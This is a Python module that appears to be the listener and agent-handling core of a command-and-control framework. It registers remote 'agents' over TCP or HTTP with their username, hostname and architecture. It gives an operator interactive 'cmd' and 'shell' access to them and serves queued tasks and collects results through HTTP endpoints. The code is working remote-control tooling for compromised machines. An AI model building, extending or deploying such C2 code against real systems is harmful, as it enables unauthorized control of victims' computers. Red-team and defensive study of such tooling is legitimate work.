from core.utils.config import CONFIG
from core.agents import commands
from core.agents.utils import task as taskmng
from core.utils import common
from core.transport import tcp, http

from dataclasses import dataclass, field
from typing import Dict, Any

from werkzeug.datastructures import FileStorage
from flask import request, abort

@dataclass
class RequestData:
    method: str
    url: str
    path: str
    headers: Dict[str, str]
    args: Dict[str, str]
    form: Dict[str, str]
    json: Any
    data: bytes
    remote_addr: str
    files: Dict[str, bytes] = field(default_factory=dict)

@dataclass
class Agent:
    id: str
    ip: str
    username: str
    conn_type: str
    # timestamp: datetime = common.time_now()
    conn: any = None
    status: str = "active"
    interval: str = ""
    hostname: str = ""
    arch: str = ""


printer = common.Print_str()

ALLOWED_PATH = [ r.uri for r in CONFIG.listener.http.routes.values()]
AGENTS = {}


def handle(conn_type, conn=None, addr=None):
    
    match conn_type:
        case "tcp":
            handle_tcp(conn, addr)
        case "http":
            return handle_http(conn)
        case _:
            pass

def handle_tcp(conn, addr):

    while True:
        id = common.new_id()
        if id not in AGENTS:
            break

    _, data = tcp.recv_data(conn)
    username, hostname, arch = data.split(CONFIG.agent.seperator)


    agent = Agent(
        id=id,
        ip=addr[0],
        username=username,
        hostname=hostname,
        conn=conn,
        conn_type="tcp",
        interval="real-time",
        arch=arch,
    )

    AGENTS[id] = agent
    print(f"[+] New tcp agent connected: {agent}")



def handle_http(req):
    
    while True:
        id = common.new_id()
        if id not in AGENTS:
            break

    _, _, data = http.parse_request(req)

    username, hostname, arch = data.split(CONFIG.agent.seperator)


    agent = Agent(
        id=id,
        ip=http.get_ip(req),
        username=username,
        hostname=hostname,
        conn_type="http",
        interval=CONFIG.agent.heartbeat_interval,
        arch=arch,
    )

    AGENTS[id] = agent
    print(f"[+] New http agent connected: {agent}")
    return http.generate_response()


def handle_interact(conn, id):
    try: 
        agent = AGENTS.get(id,"")
        if not agent:
            return printer.fail(f"Agent with id [{id}] not found")
        
        header ="INTERACT"
        conn_type = agent.conn_type
        
        tcp.send_data(conn, printer.success(f"Interacting with {id}"), header)
        tcp.send_data(conn, id, header)
        
        while True:
            _, raw = tcp.recv_data(conn)
            if raw is None:
                print(f"[!] Connection closed.")
                break

            cmd = raw.strip().split()
            if not cmd:
                continue

            match cmd:

                case ["tasks"]:
                    response = commands.tasks(id)
                    tcp.send_data(conn, response)

                case ["result"]:
                    response = commands.result(id)
                    tcp.send_data(conn, response)
                    
                case ["result", arg]:
                    response = commands.result(id, arg)
                    tcp.send_data(conn, response)

                case ["cmd"]:
                    response = commands.cmd_help()
                    tcp.send_data(conn, response)
                    
                case ["cmd", *cmd]:
                    cmd = " ".join(cmd)
                    response = commands.cmd(agent, cmd, conn_type)
                    tcp.send_data(conn, response)
                    
                case ["shell"]:
                    header = commands.AGENT_COMMANDS.get("shell")["header"]
                    response = commands.shell(conn, agent)
                    tcp.send_data(conn, response, header)
                    tcp.send_data(conn, " ")

                case ["exit"]:
                    return commands.exit()
                    
                case ["help"] | ["?"]:
                    response = commands.help()
                    tcp.send_data(conn, response)
                
                case _:
                    unknown = " ".join(c for c in cmd)
                    response = printer.warning(f"Unknown command: {unknown}")
                    tcp.send_data(conn, response)


    except Exception:
        agent.status = "dead"
        if agent.conn_type == "tcp":
            tcp.close(agent.conn)
        return printer.fail(f"Agent {agent.id} is dead")


def extract_request() -> RequestData:
    files = {
        k: v.read() if isinstance(v, FileStorage) else v
        for k, v in request.files.items()
    }
    
    return RequestData(
        method=request.method,
        url=request.url,
        path=request.path,
        headers=dict(request.headers),
        args=request.args.to_dict(),
        form=request.form.to_dict(),
        json=request.get_json(silent=True),
        data=request.get_data(),
        remote_addr=request.remote_addr,
        files=files
    )

def handle_before_request():

    req = extract_request()
    if req.path not in ALLOWED_PATH:
        abort(403, description="Access to this endpoint is forbidden.")
        
def handle_auth():
    req = extract_request()
    return handle("http",req)
    
def handle_task():
    req = extract_request()
    agent_id = req.args.get("id", "")
    if not agent_id:
        return http.generate_response(data="None",status=400)

    task = taskmng.get_earliest_task(agent_id)
    if not task:
        return http.generate_response(data="None")
    
    header = commands.AGENT_COMMANDS.get(task.command, "")
    if header:
        header = header["header"]

    return http.generate_response(task.id, task.command, header)
    

def handle_result():
    req = extract_request()
    
    agent_id = req.headers.get("X-Agent-Id","")
    if not agent_id:
        return http.generate_response(data="None",status=400)
    
    header, task_id, result = http.parse_request(req)
    if not task_id and result:
        return http.generate_response(data="None",status=400)
    
    task = taskmng.get_task_by_id(agent_id, task_id)
    if not task:
        return http.generate_response(data="None",status=400)

    if not taskmng.mark_task_done(agent_id, task_id, result):
        return http.generate_response(data="None",status=400)

    return http.generate_response(data="Done")
